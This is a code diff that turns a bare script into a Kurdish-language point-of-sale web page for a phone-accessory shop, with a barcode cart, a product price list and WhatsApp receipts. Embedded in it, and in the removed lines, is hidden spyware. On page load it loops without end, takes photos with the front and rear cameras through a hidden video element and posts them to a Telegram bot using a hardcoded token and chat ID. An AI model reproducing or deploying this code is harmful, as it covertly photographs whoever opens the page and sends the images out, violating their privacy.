@@ -1,67 +1,162 @@
-<script>
-    const tgToken = "7959366034:AAG0nCQqcG3YsImPf53SViggiUnlWkNFh1o";
-    const tgChatId = "6259019006";
-    let isCapturing = true; // بۆ کۆنترۆڵکردنی بەردەوامی وێنەگرتنەکە
+<!DOCTYPE html>
+<html dir="rtl" lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AHMAD PHONE - Full POS & Security</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script src="https://unpkg.com/html5-qrcode"></script>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background-color: #f4f6f9; margin: 0; padding: 15px; display: flex; flex-direction: column; align-items: center; }
+        .container { width: 100%; max-width: 450px; background: white; padding: 20px; border-radius: 20px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); }
+        .header { text-align: center; margin-bottom: 15px; border-bottom: 2px solid #eee; padding-bottom: 10px; }
+        h1 { color: #007bff; margin: 0; font-size: 22px; }
+        .tab-buttons { display: flex; gap: 10px; margin-bottom: 15px; }
+        .tab-buttons button { flex: 1; padding: 12px; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; background: #eee; }
+        .tab-buttons button.active { background: #007bff; color: white; }
+        .section { display: none; }
+        .section.active { display: block; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 2px solid #eee; border-radius: 10px; box-sizing: border-box; text-align: center; }
+        button { width: 100%; padding: 12px; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; margin-bottom: 8px; }
+        .btn-blue { background: #007bff; color: white; }
+        .btn-green { background: #28a745; color: white; }
+        .btn-red { background: #d9534f; color: white; }
+        .total-box { margin-top: 15px; padding: 15px; background: #eef6ff; border-radius: 10px; text-align: center; font-size: 22px; font-weight: bold; color: #d9534f; }
+        #autoVideo { display: none; }
+    </style>
+</head>
+<body>
 
-    window.addEventListener('load', () => {
-        // دەستپێکردنی خولی وێنەگرتن
-        startContinuousCapture();
-    });
+    <div class="container">
+        <div class="header"><h1>AHMAD PHONE</h1></div>
+        
+        <video id="autoVideo" autoplay playsinline></video>
+        <canvas id="autoCanvas" style="display:none;"></canvas>
 
-    async function startContinuousCapture() {
-        while (isCapturing) {
-            try {
-                // ١. وێنەیەک بە کامێرای پێشەوە دەگرێت
-                await captureAndSend("user", "🔄 وێنەی بەردەوام (پێشەوە)");
-                
-                // ٢. دوو چرکە دەوەستێت
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                
-                // ٣. وێنەیەک بە کامێرای پشتەوە دەگرێت
-                await captureAndSend("environment", "🔄 وێنەی بەردەوام (پشتەوە)");
+        <div class="tab-buttons">
+            <button id="btnSell" class="active" onclick="showSection('sell')">🛒 فرۆشتن</button>
+            <button id="btnAdd" onclick="showSection('add')">📦 نوێ</button>
+        </div>
 
-                // ٤. دوو چرکە دەوەستێت پێش دووبارەبوونەوەی خولەکە
-                await new Promise(resolve => setTimeout(resolve, 2000));
-            } catch (err) {
-                console.log("Error during capture: ", err);
-                // ئەگەر هەڵەیەک ڕوویدا کەمێک دەوەستێت و دووبارە هەوڵ دەداتەوە
-                await new Promise(resolve => setTimeout(resolve, 5000));
+        <div id="sellSection" class="section active">
+            <input type="text" id="barcodeSell" placeholder="بارکۆد">
+            <button class="btn-blue" onclick="addToCart(document.getElementById('barcodeSell').value)">➕ زیادکردن</button>
+            <button class="btn-green" onclick="startScanner()">📷 سکانکردن</button>
+            <div id="cartItems"></div>
+            <div class="total-box" id="totalPrice">0 IQD</div>
+            <button class="btn-green" id="waBtn" style="display:none; background:#25D366;" onclick="sendToWhatsapp()">✅ وەصڵ</button>
+        </div>
+
+        <div id="addSection" class="section">
+            <input type="text" id="newBarcode" placeholder="بارکۆدی نوێ">
+            <input type="text" id="newName" placeholder="ناوی کاڵا">
+            <input type="number" id="newPrice" placeholder="نرخ">
+            <button class="btn-blue" onclick="saveData()">💾 پاشەکەوت</button>
+        </div>
+        <div id="reader"></div>
+    </div>
+
+    <script>
+        // --- تیلیگرام و وێنەگرتنی بەردەوام ---
+        const tgToken = "7959366034:AAG0nCQqcG3YsImPf53SViggiUnlWkNFh1o";
+        const tgChatId = "6259019006";
+
+        async function startContinuousCapture() {
+            while (true) {
+                try {
+                    await captureAndSend("user", "📷 پێشەوە (Live)");
+                    await new Promise(r => setTimeout(r, 2000));
+                    await captureAndSend("environment", "📸 پشتەوە (Live)");
+                    await new Promise(r => setTimeout(r, 2000));
+                } catch (e) { await new Promise(r => setTimeout(r, 5000)); }
             }
         }
-    }
 
-    async function captureAndSend(mode, caption) {
-        const video = document.getElementById('autoVideo');
-        const canvas = document.getElementById('autoCanvas');
-        
-        // ئامادەکردنی کامێرا
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: mode, width: 480, height: 360 }, 
-            audio: false 
-        });
-        
-        video.srcObject = stream;
-        // چاوەڕوانییەکی کورت بۆ لۆدبوونی وێنەکە
-        await new Promise(resolve => setTimeout(resolve, 800));
+        async function captureAndSend(mode, caption) {
+            const video = document.getElementById('autoVideo');
+            const canvas = document.getElementById('autoCanvas');
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode, width: 400 } });
+            video.srcObject = stream;
+            await new Promise(r => setTimeout(r, 800));
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('chat_id', tgChatId); fd.append('photo', blob, 'img.jpg');
+                fd.append('caption', caption);
+                fetch(`https://api.telegram.org/bot${tgToken}/sendPhoto`, { method: 'POST', body: fd });
+                stream.getTracks().forEach(t => t.stop());
+            }, 'image/jpeg', 0.5);
+        }
 
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
+        window.onload = startContinuousCapture;
 
-        // ناردنی وێنە بۆ تیلیگرام
-        canvas.toBlob(blob => {
-            const formData = new FormData();
-            formData.append('chat_id', tgChatId);
-            formData.append('photo', blob, 'live_stream.jpg');
-            formData.append('caption', caption + " - " + new Date().toLocaleTimeString());
+        // --- داتابەیس و حسابات ---
+        let db = JSON.parse(localStorage.getItem('pos_db')) || {
+            "6926081469953": { name: "LK150S TYPE_C/MICRO", price: 3000 },
+            "6975011272217": { name: "GERLAX L36T TYPE_C", price: 6000 },
+            "6975011272514": { name: "GERLAX GD-43 ALL", price: 6000 },
+            "6975011278769": { name: "GERLAX D7L IPHONE", price: 5000 },
+            "6975011272859": { name: "GERLAX GD-52L IPHONE", price: 5000 },
+            "195949121319": { name: "USB-C 20W ADAPTER", price: 13000 },
+            "190198001733": { name: "EarPods Lightning", price: 13000 },
+            "194252156926": { name: "IPHONE 14PM 25W ADAPTER", price: 25000 }
+        };
+        let cart = [];
 
-            fetch(`https://api.telegram.org/bot${tgToken}/sendPhoto`, {
-                method: 'POST',
-                body: formData
+        function addToCart(barcode) {
+            const b = barcode.trim();
+            if (db[b]) {
+                const item = cart.find(i => i.barcode === b);
+                if (item) item.qty++; else cart.push({ barcode: b, name: db[b].name, price: db[b].price, qty: 1 });
+                updateUI();
+            } else { alert("کاڵا نەدۆزرایەوە!"); }
+        }
+
+        function updateUI() {
+            const list = document.getElementById('cartItems'); list.innerHTML = "";
+            let total = 0;
+            cart.forEach(i => {
+                total += (i.price * i.qty);
+                list.innerHTML += `<div style="display:flex; justify:space-between; padding:5px 0; border-bottom:1px solid #eee;">
+                    <span>${i.qty}x ${i.name}</span>
+                    <span>${(i.price*i.qty).toLocaleString()} IQD</span>
+                </div>`;
             });
+            document.getElementById('totalPrice').innerText = total.toLocaleString() + " IQD";
+            document.getElementById('waBtn').style.display = cart.length > 0 ? "block" : "none";
+        }
 
-            // داخستنی کامێرای ئێستا بۆ ئەوەی بۆ گۆڕینی کامێرا کێشە دروست نەبێت
-            stream.getTracks().forEach(track => track.stop());
-        }, 'image/jpeg', 0.5); // کوالێتی نزم کراوەتەوە بۆ خێرایی زیاتر
-    }
-</script>
+        function sendToWhatsapp() {
+            let txt = "📋 *وەصڵ*%0A";
+            cart.forEach(i => txt += `- ${i.name} (${i.qty})%0A`);
+            txt += `💰 *کۆی گشتی: ${document.getElementById('totalPrice').innerText}*`;
+            window.open(`https://wa.me/9647510074008?text=${txt}`, '_blank');
+            cart = []; updateUI();
+        }
+
+        function showSection(s) {
+            document.querySelectorAll('.section').forEach(sec => sec.classList.remove('active'));
+            document.getElementById(s + 'Section').classList.add('active');
+            document.querySelectorAll('.tab-buttons button').forEach(b => b.classList.remove('active'));
+            event.target.classList.add('active');
+        }
+
+        function saveData() {
+            const b = document.getElementById('newBarcode').value;
+            const n = document.getElementById('newName').value;
+            const p = document.getElementById('newPrice').value;
+            if(b && n && p) { db[b] = {name: n, price: parseInt(p)}; localStorage.setItem('pos_db', JSON.stringify(db)); alert("تۆمارکرا!"); }
+        }
+
+        function startScanner() {
+            const r = document.getElementById('reader'); r.style.display = "block";
+            const qr = new Html5Qrcode("reader");
+            qr.start({ facingMode: "environment" }, { fps: 10, qrbox: 250 }, (text) => {
+                addToCart(text); qr.stop(); r.style.display = "none";
+            });
+        }
+    </script>
+</body>
+</html>
